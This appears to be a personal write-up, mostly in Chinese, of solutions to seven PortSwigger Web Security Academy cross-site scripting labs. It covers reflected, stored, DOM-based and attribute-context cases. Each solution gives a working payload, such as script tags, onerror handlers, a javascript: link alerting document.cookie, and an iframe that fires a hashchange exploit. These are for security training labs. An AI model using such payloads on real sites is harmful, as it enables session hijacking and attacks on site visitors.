# Cross-site scripting

## [Lab: Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
### 題目敘述
 This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function. 

### 題目解釋
在搜尋功能的反射性 XSS

### 解答
在搜尋上面打

```
<script>alert(1)</script>
```

## [Lab: Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
### 題目敘述
 This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed. 
### 題目解釋
儲存型 XSS 在留言區

### 解答
在留言的 Comment 上面打

```
<script>alert(1)</script>
```

## [Lab: DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 
### 題目解釋

### 解答
觀察原始碼可以發現

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
```

這邊有一個 tracking，會塞到 img src 裡面，所以我可以先用 `">` 把它閉合再 XSS

在搜尋輸入
```
"> <script>alert(1)</script>
```


## [Lab: DOM XSS in innerHTML sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 
### 題目解釋
題目說是 DOM-based 在 innderHTML 裡面

### 解答
搜尋列寫
```html
<img src='' onerror="alert(1)">
```


## [Lab: DOM XSS in jQuery anchor href attribute sink using location.search source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

To solve this lab, make the "back" link alert document.cookie. 
### 題目解釋
Href 除了跳轉路徑之外，也可以塞 `javascript:alert(1)`
### 解答
先隨便點到一篇文底下，例如

```
https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/post?postId=1
```

觀察 `Submit feedback` 的連結會變成 `https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/feedback?returnPath=/post`

```javascript=
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

我們知道在 href 裡面塞 `javascript:alert(1)` 可以 alert

所以
```
https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

然後按下 Back 就可以噴出餅乾了


## [Lab: DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
### 題目敘述
 This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. 

### 題目解釋
在 jQuery 裡面塞 XSS，他不用管句法的完整性，只要有 html 就會執行了

### 解答

看起來可疑的程式碼在這邊
```
$(window).on('hashchange', function(){
var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
if (post) post.get(0).scrollIntoView();
```

直接觀察，使用者可控的地方是 `window.location.hash`，也就是網址最後面的 `#`，例如使用
```
https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#Procrastination
```

可以直接跳到 `Procrastination` 的區塊，而其中，用上面的例子
```
window.location.hash.slice(1)
```

會回傳

```
"Procrastination"
```

而在前面有一個 `decodeURIComponent` 會做 URLDecode 的部分，整段他會做一個字串加法，再放到 `$()` 中

字串加法在這邊
```
'section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'
```

經過了一些測試， JQuery 可以直接 parse HTML，而且不會特別去管語法的完整性，也就是說右括號不呱也沒關係，例如這樣就可以 XSS

```
$(`h2:contains(""<img src=1 onerror=alert(1)>`)
```

繼續測試發現，甚至這樣也可以
```
$(`h2:contains(""<img src=1 onerror=alert(1)>`)
```

所以那就用最簡單的方法，網址打
```
https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#%3Cimg%20src=1%20onerror=alert(1)%3E
```

但需要注意的是他的觸發條件是 `hashchange`，所以我們需要建立一個 iframe 來控制 change 的 src 讓他途中會變動

```html
<script>
    function meow(){
        console.log(document.getElementsByTagName("iframe")[0].src);
      setTimeout(() => {
        document.getElementsByTagName("iframe")[0].src="https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#%3Cimg%20src%3D1%20onerror%3Dprint%28%29%3E";
        console.log(document.getElementsByTagName("iframe")[0].src);
          }, 
      1000);
    }
</script>

<iframe src="https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#meow" onload="meow()">
</iframe>
```

## [Lab: Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)
### 題目敘述
 This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function. 
### 題目解釋
不能用 HTML 的角括號，試試看汙染 HTML 的 attribute，用一些事件來構成 XSS

### 解答
發現 如果丟最基本的 XSS
```
https://ac4e1fb81fd35987c09c1b03005500aa.web-security-academy.net/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

會被 HTML Entity 給 Encode

```
<input type=text placeholder='Search the blog...' name=search value="&lt;script&gt;alert(1)&lt;/script&gt;">
```



如果輸入 `123"` 的話，會變成

```
<input type=text placeholder='Search the blog...' name=search value="123"">
```

代表可以用 `"` 關閉 value 的雙引號

使用 `onmouseover` 這個事件，就過了

```
https://ac4e1fb81fd35987c09c1b03005500aa.web-security-academy.net/?search=123%22%20onmouseover=%22alert(1)
```

但我覺得沒有很清楚就是他不是打開就會跳 QQ